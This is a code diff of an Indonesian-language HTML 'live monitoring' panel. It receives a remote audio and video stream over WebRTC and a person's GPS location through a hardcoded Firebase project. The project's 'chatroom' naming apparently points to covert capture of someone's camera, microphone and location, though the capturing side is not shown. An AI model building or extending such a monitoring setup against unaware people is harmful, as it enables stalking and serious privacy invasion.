@@ -1,35 +1,81 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Monitor Panel</title>
+    <meta charset="UTF-8">
+    <title>Panel Monitor Real-Time</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background: #1a1a1a; color: white; font-family: sans-serif; padding: 20px; text-align: center; }
+        #videoBox { width: 100%; max-width: 640px; border: 3px solid #00ff00; background: #000; margin: 0 auto; }
+        video { width: 100%; }
+        .controls { margin-top: 20px; padding: 20px; background: #222; border-radius: 10px; }
+        button { padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border: none; border-radius: 5px; }
+        .btn-audio { background: #00ff00; color: #000; margin-bottom: 10px; }
+        .btn-reload { background: #ff3333; color: #fff; font-size: 14px; }
+    </style>
 </head>
-<body style="background:#000; color:#0f0; text-align:center; font-family:monospace;">
-    <h1>LIVE MONITOR</h1>
-    <img id="liveImg" style="border:2px solid #0f0; width:80%;">
-    <div id="info" style="margin-top:20px;"></div>
+<body>
+    <h2>LIVE MONITORING: AUDIO & VIDEO</h2>
+    
+    <div id="videoBox">
+        <!-- Audio harus dimulai lewat interaksi user -->
+        <video id="rv" autoplay playsinline></video>
+    </div>
+
+    <div class="controls">
+        <button id="audioBtn" class="btn-audio">🔊 AKTIFKAN SUARA & VIDEO</button>
+        <br>
+        <div id="locData">Menunggu lokasi...</div>
+        <br>
+        <button onclick="location.reload()" class="btn-reload">RESTART SISTEM</button>
+    </div>
 
     <script>
-        const config = {
+        const firebaseConfig = {
             apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
             databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
             projectId: "chatroom-e9b3f"
         };
-        firebase.initializeApp(config);
-        const db = firebase.database().ref('simple_monitor');
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database().ref('secure_p2p_v3');
 
-        // Pantau Gambar
-        db.child('img').on('value', s => {
-            if(s.val()) document.getElementById('liveImg').src = s.val();
+        let pc = new RTCPeerConnection({
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
         });
 
-        // Pantau Lokasi
-        db.child('loc').on('value', s => {
-            const d = s.val();
-            if(d) document.getElementById('info').innerHTML = 
-                `LOKASI: <a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank" style="color:#0f0">KLIK LIHAT MAPS</a>`;
-        });
+        // Tombol aktivasi (PENTING untuk browser)
+        document.getElementById('audioBtn').onclick = function() {
+            document.getElementById('rv').play();
+            this.style.background = "#555";
+            this.innerText = "SISTEM AKTIF";
+        };
+
+        pc.ontrack = e => {
+            document.getElementById('rv').srcObject = e.streams[0];
+        };
+
+        async function start() {
+            db.child('sdp/offer').on('value', async s => {
+                const o = s.val();
+                if(o && !pc.currentRemoteDescription) {
+                    await pc.setRemoteDescription(new RTCSessionDescription(o));
+                    const a = await pc.createAnswer();
+                    await pc.setLocalDescription(a);
+                    db.child('sdp/answer').set({type: a.type, sdp: a.sdp});
+                }
+            });
+
+            pc.onicecandidate = e => { if(e.candidate) db.child('ice_m').push(e.candidate.toJSON()); };
+            db.child('ice_t').on('child_added', s => pc.addIceCandidate(new RTCIceCandidate(s.val())));
+
+            db.child('loc').on('value', s => {
+                const d = s.val();
+                if(d) document.getElementById('locData').innerHTML = `LOKASI: <a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank" style="color:#0f0">LIHAT DI MAPS</a>`;
+            });
+        }
+
+        start();
     </script>
 </body>
 </html>
